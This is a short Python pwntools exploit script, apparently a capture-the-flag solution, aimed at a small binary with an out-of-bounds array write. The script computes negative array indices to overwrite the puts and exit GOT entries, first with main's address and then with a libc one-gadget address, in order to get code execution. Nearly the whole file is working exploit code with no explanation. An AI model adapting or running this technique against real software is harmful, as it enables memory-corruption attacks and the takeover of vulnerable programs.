#!/usr/bin/env python3

from pwn import *

puts_plt = 0x601018
arr = 0x6022a0
main = 0x400737

print('1') # array size n
print(int((puts_plt - arr) / 4)) # write in puts_plt addr
print(main)

exit_plt = 0x601048
libc_base = 0x00007ffff7dd8000
offset = 0xe6c81
gadget = libc_base + offset
hex_gadget = hex(gadget)

lst = [hex_gadget[i:i+2] for i in range(2, len(hex_gadget) - 1, 2)]
lst = [int(''.join(lst[-4:]), 16)] + [int(''.join(lst[:-4]), 16)]

#print(hex_gadget)
#print(lst)
#print([hex(i) for i in lst])

for j, d in enumerate(lst):
    arr += 0x20
    n = 1
    i = int((exit_plt - arr) / 4) + j # write in exit_plt addr
    print(n)
    print(i)
    print(d)

print(0x200)

"""
scanf n = 0x400779
scanf i = 0x4007cc
scanf d = 0x40080a
calloc = 0x40079f
after calloc = 0x4007a4
exit = 0x40078d
"""
